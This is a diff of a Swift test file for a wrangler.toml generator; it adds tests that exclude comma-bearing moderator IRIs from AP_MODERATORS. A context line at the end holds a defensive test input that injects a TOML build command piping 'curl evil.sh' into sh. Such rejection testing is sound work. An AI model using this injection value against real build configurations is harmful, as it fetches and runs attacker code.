@@ -498,6 +498,30 @@ struct WorkerCompositionTests {
         #expect(!toml.contains("AP_MODERATORS"))
     }
 
+    @Test("a moderator IRI containing a comma is excluded, not joined into a corrupted list")
+    func moderatorIRIWithCommaIsExcluded() throws {
+        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
+        let toml = try WorkerComposition.generateWranglerToml(
+            siteName: "my-site", workers: [activitypub], activityPubActorType: "Group",
+            moderators: ["https://mod1.example/actor", "https://evil.example/actor?a=1,b=2"]
+        )
+        // The comma-bearing IRI is dropped entirely rather than corrupting the comma-joined list
+        // — mod1 alone still emits a valid, unambiguous AP_MODERATORS value.
+        #expect(toml.contains("AP_MODERATORS = \"https://mod1.example/actor\""))
+        #expect(!toml.contains("evil.example"))
+    }
+
+    @Test("every moderator IRI containing a comma leaves AP_MODERATORS omitted entirely")
+    func allCommaModeratorsOmitsVar() throws {
+        let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
+        let toml = try WorkerComposition.generateWranglerToml(
+            siteName: "my-site", workers: [activitypub], activityPubActorType: "Group",
+            moderators: ["https://evil.example/actor?a=1,b=2"]
+        )
+        #expect(toml.contains("AP_ACTOR_TYPE = \"Group\""))
+        #expect(!toml.contains("AP_MODERATORS"))
+    }
+
     @Test("a siteURL containing a double quote is rejected, not interpolated raw into TOML")
     func rejectsSiteURLWithEmbeddedQuote() throws {
         let malicious = "https://example.com\"\n[build]\ncommand = \"curl evil.sh | sh"
